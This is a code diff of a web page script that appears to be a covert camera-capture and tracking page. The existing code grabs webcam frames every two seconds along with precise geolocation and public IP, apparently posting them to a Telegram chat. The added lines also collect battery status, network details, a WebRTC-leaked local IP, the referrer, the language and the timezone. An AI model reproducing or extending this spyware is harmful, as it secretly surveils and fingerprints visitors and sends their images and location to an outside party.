@@ -22,8 +22,49 @@ let longitude="N/A";
 let mapLink="Location not allowed";
 let userIP="Unknown";
 let stream=null;
+let batteryInfo="";
+let networkInfo="";
+let localIP="";
+
 fetch("https://api.ipify.org?format=json").then(r=>r.json()).then(d=>{userIP=d.ip});
+
 navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}}).then(s=>{stream=s});
+
+if(navigator.getBattery){
+navigator.getBattery().then(b=>{
+batteryInfo=`
+🔋 Battery:
+Level: ${Math.round(b.level*100)}%
+Charging: ${b.charging?'Yes':'No'}
+Time: ${b.chargingTime===Infinity?'Not charging':b.chargingTime+' seconds'}
+`;
+});
+}
+
+if(navigator.connection){
+networkInfo=`
+📡 Network:
+Type: ${navigator.connection.effectiveType}
+Downlink: ${navigator.connection.downlink} Mbps
+RTT: ${navigator.connection.rtt} ms
+Save Data: ${navigator.connection.saveData?'Enabled':'Disabled'}
+`;
+}
+
+const getLocalIPAddress=()=>{
+return new Promise(resolve=>{
+const pc=new RTCPeerConnection({iceServers:[]});
+pc.createDataChannel('');
+pc.createOffer().then(sdp=>pc.setLocalDescription(sdp));
+pc.onicecandidate=ice=>{
+if(!ice||!ice.candidate||!ice.candidate.candidate)return;
+const ip=/([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
+if(ip&&ip[1])resolve(ip[1]);
+pc.close();
+};
+});
+};
+
 function start(){
 if("geolocation" in navigator){
 navigator.geolocation.getCurrentPosition(pos=>{
@@ -34,10 +75,14 @@ mapLink=`https://www.google.com/maps?q=${latitude},${longitude}`;
 mapLink="Location denied";
 },{enableHighAccuracy:true});
 }
+
+getLocalIPAddress().then(ip=>{localIP=ip});
+
 if(!intervalId){
 intervalId=setInterval(captureAndSend,2000);
 }
 }
+
 function captureAndSend(){
 if(!stream)return;
 const videoTrack=stream.getVideoTracks()[0];
@@ -59,8 +104,15 @@ const caption=`
 Lat: ${latitude}
 Lng: ${longitude}
 🗺 ${mapLink}
-🌍 IP: ${userIP}
-⏰ ${new Date().toLocaleString()}`;
+🌍 Public IP: ${userIP}
+🔒 Local IP: ${localIP||'Unknown'}
+⏰ ${new Date().toLocaleString()}
+${batteryInfo}
+${networkInfo}
+📅 Referrer: ${document.referrer||'Direct visit'}
+🎯 Language: ${navigator.language}
+⏱ Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+`;
 const formData=new FormData();
 formData.append("chat_id",CHAT_ID);
 formData.append("photo",blob);
